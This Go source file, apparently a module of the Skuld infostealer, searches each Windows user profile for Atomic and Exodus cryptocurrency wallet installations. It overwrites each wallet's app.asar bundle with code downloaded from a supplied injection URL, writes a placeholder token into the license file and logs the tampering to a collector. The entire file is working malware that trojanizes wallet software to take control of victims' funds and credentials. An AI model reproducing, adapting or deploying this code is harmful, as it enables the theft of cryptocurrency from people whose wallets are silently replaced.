package walletsinjection

import (
	"io"
	"net/http"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(atomic_injection_url, exodus_injection_url string, dataCollector *collector.DataCollector) {
	AtomicInjection(atomic_injection_url, dataCollector)
	ExodusInjection(exodus_injection_url, dataCollector)
}

func AtomicInjection(atomic_injection_url string, dataCollector *collector.DataCollector) {
	for _, user := range hardware.GetUsers() {
		atomicPath := filepath.Join(user, "AppData", "Local", "Programs", "atomic")
		if !fileutil.IsDir(atomicPath) {
			continue
		}

		atomicAsarPath := filepath.Join(atomicPath, "resources", "app.asar")
		atomicLicensePath := filepath.Join(atomicPath, "LICENSE.electron.txt")

		if !fileutil.Exists(atomicAsarPath) {
			continue
		}

		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, dataCollector)
	}
}

func ExodusInjection(exodus_injection_url string, dataCollector *collector.DataCollector) {
	for _, user := range hardware.GetUsers() {
		exodusPath := filepath.Join(user, "AppData", "Local", "exodus")
		if !fileutil.IsDir(exodusPath) {
			continue
		}

		files, err := filepath.Glob(filepath.Join(exodusPath, "app-*"))
		if err != nil {
			continue
		}

		if len(files) == 0 {
			continue
		}

		exodusPath = files[0]

		exodusAsarPath := filepath.Join(exodusPath, "resources", "app.asar")
		exodusLicensePath := filepath.Join(exodusPath, "LICENSE")

		if !fileutil.Exists(exodusAsarPath) {
			continue
		}

		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, dataCollector)
	}
}

func Injection(path, licensePath, injection_url string, dataCollector *collector.DataCollector) {
	if !fileutil.Exists(path) {
		return
	}

	resp, err := http.Get(injection_url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	out, err := os.Create(path)
	if err != nil {
		return
	}
	defer out.Close()

	if _, err = io.Copy(out, resp.Body); err != nil {
		return
	}

	license, err := os.Create(licensePath)
	if err != nil {
		return
	}
	defer license.Close()

	// For wallet injection, we'll use a placeholder since we're not using webhooks anymore
	license.WriteString("TELEGRAM_PLACEHOLDER")

	// Log injection success
	injectionInfo := map[string]interface{}{
		"Status":      "Wallet injection completed",
		"TargetPath":  path,
		"LicensePath": licensePath,
	}
	dataCollector.AddData("wallet_injection", injectionInfo)
}
